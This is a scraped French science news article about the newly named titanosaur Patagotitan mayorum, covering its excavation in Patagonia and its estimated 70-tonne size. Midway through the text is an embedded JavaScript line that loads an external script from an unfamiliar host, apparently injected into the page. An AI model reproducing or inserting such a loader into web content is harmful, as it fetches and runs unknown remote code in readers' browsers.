{"title": "Voici Patagotitan mayorum, le plus grand de tous les dinosaures", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-08-11", "content": "Il y a environ cent millions d'annees, dans l'actuelle Patagonie, des jeunes titanosaures vivaient dans une plaine d'inondation qui deviendra plus tard un desert en Patagonie. Leurs restes fossilises viennent de reveler une nouvelle espece qui pourrait fort bien etre la plus grande parmi tous les dinosaures. Son nom :  Patagotitan mayorum . Ce qu'il faut retenir Les titanosaures forment un groupe de sauropodes herbivores celebres pour leurs grandes tailles. Les plus grands datent du Cretace et ont ete decouverts en Argentine. Une nouvelle espece, dont le squelette avait deja ete reconstitue pour une exposition, a ete l'objet d'une etude longue de quatre annees. Patagotitan mayorum , c'est son nom, depasse pour le moment par sa taille et son poids tous les autres dinosaures geants connus a ce jour. En  matiere  de  dinosaures , l'Argentine et la Patagonie occupent regulierement le devant de la scene depuis plus d'une decennie. C'est avec raison car on y a trouve des specimens parmi les plus anciens, comme  Herrerasaurus , et parmi les plus grands, comme  Argentinosaurus . Ce dernier fait partie des  Titanosauria  (les titanosaures en francais), un groupe de dinosaures sauropodes  herbivores  dominants a la fin du  Cretace  et dont on trouve des representants un peu partout sur la planete, y compris en France. En 2012, un employe du ranch de La Flecha en Patagonie, propriete de la famille Mayo, avait signale la presence d'ossements fossilises. Lorsque l'importance du site a ete realisee, les paleontologues ont commence a affluer pour venir fouiller. Ce ne sont pas moins de six animaux qui ont ete identifies dans les plus de 150  fossiles  deterres par une quinzaine de chercheurs, geologues et etudiants, gratuitement heberges par les Mayo. Il s'agissait clairement des restes d'individus sans doute jeunes d'une nouvelle  espece  de dinosaure de tres grande taille mais dont il restait a preciser la nature.  Une presentation de la decouverte du nouveau titanosaure argentin. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c)  American Museum of Natural History Le plus grand titanosaure ? Pas certain Des 2013, cependant, il etait devenu evident qu'il s'agissait d'un  titanosaure  et peut-etre du plus grand dinosaure decouvert a ce jour, de sorte que cette decouverte avait ete rapidement mediatisee et qu'un documentaire de la  BBC  lui avait ete consacre. Il etait toutefois encore trop tot pour lui donner un nom et affirmer avec certitude qu'un nouveau record de taille avait ete etabli.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les paleontologues ont patiemment travaille durant quatre annees, comparant les donnees collectees a partir de l'etude des ossements a celles des autres grands  sauropodes  connus du Cretace et ils viennent aujourd'hui de publier leurs conclusions dans un article des  Proceedings of the Royal Society of London . Photo prise au moment des fouilles, en 2013, montrant le femur de 2,40 m de long. Le paleontoloque Diego Pol, du Musee de paleontologie Egidio Feruglio, pose devant lui. (c)  Museo paleontologico Egidio Feruglio  (MEF)                               Patagotitan mayorum , un titanosaure de 70 tonnes Patagotitan mayorum  vient ainsi d'entrer de plain pied dans le monde des Titanosaures. Il s'agit bien d'un <<  Titan  de Patagonie >> ( Patagotitan ) et il << appartient >> a la famille Mayo, d'ou le terme  mayorum , en son honneur et pour la remercier de son aide pour les fouilles, precisent les chercheurs. Les lois de la biomecanique permettent d'estimer le poids d'un  vertebre  en fonction des caracteristiques de ses os, qui doivent supporter son poids. Ceux du plus grand de ces fossiles ont ete scannes au  laser , ce qui a permis de reconstituer sur  ordinateur  le squelette de  Patagotitan mayorum  puis d'y ajouter des chairs. Les paleontologues en concluent qu'il pouvait peser environ 70 tonnes, soit le poids d'environ 10 elephants africains. Il pouvait mesurer environ 37 metres de long et 8 metres au garrot. Un moulage de son squelette a deja fait l'objet d'une exposition a l' American Museum of Natural History  en 2016. Interview : trois dinosaures exceptionnels                       Les dinosaures sont des creatures etonnantes de par leur nature, leurs capacites ou encore leur taille. Ils ne connaissent pas d'equivalent dans le monde animal actuel. Futura-Sciences a interviewe Eric Buffetaut, paleontologue, afin qu'il nous parle des dinosaures les plus surprenants.                                       ", "theme": "planete"}